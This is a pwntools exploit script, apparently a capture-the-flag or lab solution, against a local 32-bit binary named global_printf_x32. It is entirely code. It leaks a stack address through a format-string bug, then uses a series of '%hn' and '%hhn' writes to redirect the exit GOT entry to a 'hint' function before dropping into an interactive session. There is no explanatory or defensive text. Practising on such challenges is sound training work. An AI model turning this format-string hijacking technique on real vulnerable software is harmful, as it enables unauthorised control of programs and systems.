from pwn import*
context.log_level = 'debug'
o = process("./global_printf_x32")
elf = ELF("./global_printf_x32")
exit_got = elf.got['exit']
hint = elf.sym['hint']
o.sendline(b"1")
o.sendline(b"%5$p")
leak_addr = int(o.recv(), 16)
stack_addr = leak_addr - 176
o.sendline(b"1")
payload = ("%{}d%5$hn".format(stack_addr & 0xffff)).encode()
o.sendline(payload)
o.sendline(b"1")
payload = ("%{}d%53$hn".format(exit_got & 0xffff)).encode()
o.sendline(payload)
o.sendline(b"1")
payload = ("%{}d%5$hhn".format((stack_addr + 2) & 0xff)).encode()
o.sendline(payload)
o.sendline(b"1")
payload = ("%{}d%53$hn".format((exit_got >> 16) & 0xffff)).encode()
o.sendline(payload)
o.sendline(b'1')
payload = ("%{}d%9$hn".format(hint & 0xfffff)).encode()
o.sendline(payload)
o.interactive()
